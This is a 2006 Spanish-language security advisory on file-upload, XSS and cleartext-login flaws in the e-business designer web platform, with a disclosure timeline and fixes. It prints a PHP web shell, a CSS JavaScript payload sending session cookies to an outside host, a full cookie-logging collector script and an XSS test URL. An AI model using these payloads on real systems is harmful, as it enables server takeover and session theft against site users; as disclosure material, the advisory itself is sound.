@@ -1,0 +1,284 @@
+
+          ===============================
+                   - Advisory -
+          ===============================
+  
+  Título:   Múltiples vulnerabilidades en e-business designer
+Gravedad:   Crítica
+   Fecha:   03.May.2006
+   Autor:   Pedro Andújar <pandujar *@* selfdefense.es>      
+     WEB:   http://www.digitalsec.es
+	    	http://www.514.es/
+
+
+.: [ INTRODUCCIÓN ] :.
+	
+  eBD es una potente herramienta de desarrollo integral que permite la producción, gestión 
+y publicación de información mediante Internet o una Intranet, desde un navegador web, sin 
+necesidad de implementaciones complejas ni costosas.
+
+  Con eBD se puede desarrollar cualquier tipo de aplicación web, ya sea intranet, extranet, 
+portal, etc. o bien integrar cualquier otro desarrollo o aplicación ya implantada, permitiendo 
+el acceso y la gestión de la información de forma centralizada en un único entorno Web.
+
+  Esta herramienta está extensamente utilizada en ayuntamientos y hospitales de toda España así 
+como otras conocidas empresas: d-link, Terra, RTVE, Banesto...
+
+.: [ DESCRIPCIÓN TÉCNICA ] :.
+
+  Durante el desarrollo de unas pruebas de evaluación sobre varias aplicaciones gestionadas
+por el software e-businness designer, se detectaron los siguientes fallos:
+
+
+.: [ DEFECTO #1 ]
+
+Gravedad:   Alta
+Título:     Posibilidad de subir ficheros al sistema sin autenticación.
+Afecta:     <= v3.1.4
+
+  El acceso una a herramienta de edición web sin autenticación, permite a usuarios remotos la subida
+de ficheros al sistema sin control de la extensión. Esta vulnerabilidad puede ser explotada accediendo 
+directamente a la siguiente URL:
+
+  http://ebdsite/common/html_editor/image_browser.upload.html
+
+  El fichero puede ser colocado en diversos directorios de la aplicación, por norma general es
+facilmente localizable explorando el código fuente de la web y buscando el directorio de imágenes. 
+Otra herramienta de utilidad para localizar el fichero es:
+
+  http://edbsite/common/html_editor/image_browser.html
+
+  Adicionalmente se encuentra la herramienta de edición html, cuyos parámentros son:
+
+  function abre_html_editor(form_name,name,ancho,alto,idvista,atributo,source,links)
+  {
+  	var argumentos = "form_name=" + form_name + "&name=" + name + "&source=" + source +
+			"&ebd_links=" + links;
+
+	if (idvista != null && idvista > 0)
+		argumentos += "&usar_vista=" + idvista;
+	
+	if (atributo != null && atributo.length > 0)
+		argumentos += "&usar_atributo=" + atributo;
+
+	var href = "/common/html_editor/html_editor.html?"
+
+
+  El resultado de esta vulnerabilidad, consiste en la posibilidad de subir y/o modificar ficheros en el 
+sistema, provocando una alta posibilidad de ataque tanto en el servidor como en los clientes. Podríamos 
+modificar una imagen de la web con un exploit que atacaría los navegadores de los usuarios de la web. 
+
+Este tipo de ataques fueron realizados con exito sobre un server corriendo una versión 2.3.3 de eBD:
+
+Server side exploiting:
++Ejecución de código en el sistema mediante el uso de php/asp... shells: Si el sistema tiene instalado php, 
+es posible ejecutar comandos a través del navegador, subiendo un fichero con el siguiente contenido:
+
+----------------dsr.php-----------------
+<? 
+
+$out = shell_exec($_GET["cmd"]." 2>&1");
+
+echo "<pre>$out</pre>";
+
+ ?>
+----------------dsr.php-----------------
+
+Posteriormente se podrán ejecutar comandos tal que http://edbsite/path/to/dsr.php&cmd=uname -a ; id
+
+Client side exploiting:
++Ataques de Cross Site Scripting (XSS), en aplicaciones con autenticación: Puesto que los ficheros subidos mediante 
+"image_browser.upload.html", puedes sobreescribir ficheros légitimos de la aplicación, sería posible introducir en un 
+archivo de estilos (.css) un javascript, que nos enviará las cookies de los usuarios que inicien sesión, mediante una 
+petición get al nuestro servidor:
+
+background: url('javascript:document.images[1].src="http://514.es/514.php?"+document.cookie;') repeat-x bottom;
+
+En nuestro server podemos colocar un script para loggear las cookies que recibamos, aunque ya aparecen de igual forma
+grabadas en el access_log. 
+
+XXX.XXX.XXX.XXX - - [25/Apr/2006:11:04:22 +0200] "GET /514.php?SESSION_ID=133844640fde6ef7bd6a7a9e1c5c4651 
+HTTP/1.1" 200 316 "http://ebdsite/?go=M8z23wqOtZxBnlKqIOyVzEdlo87WFfqH8prlq33Nju/nsQ==" "Mozilla/4.0 
+(compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
+
+Este script podría ser:
+
+-----------------514.php------------------
+<?
+$log = "/var/tmp/debug.log";
+$img_type = "png";
+
+function load_png($img_path) {
+        $img = imagecreatefrompng ($img_path);
+        if ($img) {
+                return $img;
+        }
+}
+
+function load_gif($img_path) {
+        $img = imagecreatefromgif ($img_path);
+        if ($img) {
+                return $img;
+        }
+}
+
+function load_jpg($img_path) {
+        $img = imagecreatefromjpeg ($img_path);
+        if ($img) {
+                return $img;
+        }
+}
+
+$init = "Connection from ".$_SERVER['REMOTE_ADDR'];
+file_put_contents($log, "$init\n", FILE_APPEND);
+foreach ($_SERVER as $key => $srv) {
+        file_put_contents($log, "$key=$srv\n", FILE_APPEND);
+}
+if (isset ($_GET) && count($_GET) > 0) {
+        file_put_contents($log, "GET params\n", FILE_APPEND);
+        foreach ($_GET as $key => $srv) {
+                file_put_contents($log, "$key=$srv\n", FILE_APPEND);
+        }
+}
+if (isset ($_POST) && count($_POST) > 0) {
+        file_put_contents($log, "POST params\n", FILE_APPEND);
+        foreach ($_POST as $key => $srv) {
+                file_put_contents($log, "$key=$srv\n", FILE_APPEND);
+
+        }
+}
+file_put_contents($log, "\n", FILE_APPEND);
+
+if ($img_type == "png") {
+        Header("Content-type: image/png");
+        ImagePNG(load_png("imgs/514.png"));
+}
+
+if ($img_type == "jpg") {
+        Header("Content-type: image/jpeg");
+        ImageJPEG(load_jpg("imgs/514.jpg"));
+}
+
+if ($img_type == "gif") {
+        Header("Content-type: image/gif");
+        ImageGIF(load_gif("imgs/514.gif"));
+}
+
+?>
+-----------------514.php------------------
+
+  
+  Adicionalmente, se ha comprobado que no existe un número máximo de sesiones concurrentes para cada usuario. 
+Esta característica facilita este tipo de ataques, ya que las cookies obtenidas de esa forma pueden ser utilizadas 
+a la vez que el usuario legítimo.
+
+
+.: [ DEFECTO #2 ]
+
+Gravedad:   Alta
+Título:     Error en la validación de datos de entrada
+Afecta:     v2.3.3 no requiere usuario
+            v3.1.4 requiere autenticarse como administrador 
+
+  En varios parámetros que parsea eBD, no se verifica la inclusión de caracteres especiales y por tanto son posibles los
+ataques de injección de código o cross site scripting. Ej:
+
+  http://ebdsite/admin/form_grupo.html?id=<script>alert("dSR");</script>
+
+  Esta URL ejecutará el alert y además el servidor nos devolverá la cadena SQL y el path físico de la aplicación tal que:
+
+  ERROR en: SELECT * FROM Contenido C WHERE C.idContenido=' AND 1=1 AND ( idArea IS NULL OR idArea=3 ) -- You have an error
+in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND
+1=1 AND ( idArea IS NULL OR idArea=3 )' at line 1 at /usr/eBD/ebd_modules/eBD/DB/DBMySQL.pm line 179. Stack:
+[/usr/eBD/ebd_modules/eBD/DB/DBMySQL.pm:179], [/usr/eBD/ebd_modules/eBD/DB/DBDriver.pm:377], [/usr/eBD/ebd_modules/eBD.pm:772],
+[/usr/eBD/ebd_modules/eBD/Contenido.pm:453], [/usr/eBD/htdocs/transhotel/archivos/dhandler:28], [/usr/eBD/htdocs/ebdsite/archivos/
+autohandler:3]
+
+  Lo mismo ocurre en la versión 2.3.3 de eBD al hacer peticiones al siguiente path: 
+  
+  * http://ebdsite/archivos/' o bien 
+  * http://ebdsite/files/'
+
+
+.: [ DEFECTO #3 ]
+
+Gravedad:   Media
+Título:     Ausencia de cifrado en proceso de autenticación
+Afecta:     <= v3.1.4
+
+  En el momento de la autenticación, que por defecto se produce vía http en lugar de https, los campos de usuario
+y contraseña viajan por la red en texto claro, sin ningún tipo de ecodeado:
+
+  zona=inicial&username=DSR&password=514&entrar=Login
+
+
+.: [ HISTORICO ] :.
+
+* 24/Abr/2006:   - Descubiertos varios fallos, durante la evaluación del software instalado en un cliente de
+                   e-business designer.
+
+* 25/Abr/2006:   - Explotación de los fallos descubiertos anteriormente.
+                 - Localización del contacto de seguridad de eBD.
+
+* 26/Abr/2006:   - Redactado borrador de este documento.
+                 - Envio del advisory a <ebd.soporte@oasyssoft.com>.
+                 - Comentarios por parte de eBD. Se indican las versiones afectadas por cada vulnerabilidad.
+
+* 27/Abr/2006:   - Modificaciones sobre el borrador.
+
+* 02/May/2006:   - Oasyssoft publica un parche sobre la subida de ficheros.
+                   (http://lists.oasyssoft.com/ebd-devel/200605/msg00000.html)
+
+* 03/May/2006    - Nuevos comentarios y modificaciones en el advisory.
+
+* 10/May/2006:   - Publicación del advisory.
+
+
+.: [ RECOMENDACIONES ] :.
+
+- Actualización inmediata del software a la última versión disponible (3.1.4). 
+- Implantación del parche de emergencia.
+  (http://lists.oasyssoft.com/ebd-devel/200605/binNr7awTFdvt.bin)
+
+  (A la espera de la release final para comienzos de Junio)
+  
+- Adicionalmente es recomendable: 
++ Deshabilitar el listado de directorios en el servidor web.
++ Forzar la navegación sobre https en la medida de lo posible.
++ Eliminar el soporte php y/o asp del sistema si lo hubiera (y no fuera requerido).
++ Implementación de firewalls de aplicación o soluciones semejantes a ModSecurity.
++ Eliminar cuentas de prueba y verificar que las contraseñas son robustas.
+
+
+.: [ RECONOCIMIENTOS ] :.
+
+  Gracias a A. Tarascó y J. Olascoaga por la ayuda con el XSS. 
+  Saludos al bRaCu y la gente de !dSR, 514, haxorcitos y dlnd-0.
+
+
+.: [ REFERENCIAS ] :.
+
+[+] [eBD] e-business designer  
+  http://www.ebdsoft.com/ 
+
+[+] Cross Site Scripting FAQ
+  http://www.cgisecurity.com/articles/xss-faq.shtml
+
+[+] NGS Advanced Sql Injection
+  http://www.ngssoftware.com/papers/advanced_sql_injection.pdf
+
+[+] ModSecurity (Open source web application firewall)
+  http://www.modsecurity.org/
+
+[+] Guide to Building Secure Web Applications
+  http://www.owasp.org/documentation/guide/guide_about.html
+
+[+] !dSR - Digital Security Research
+  http://www.digitalsec.net/
+
+[+] 514 - 77
+  http://www.514.es/
+
+
+
+                    -=EOF=-
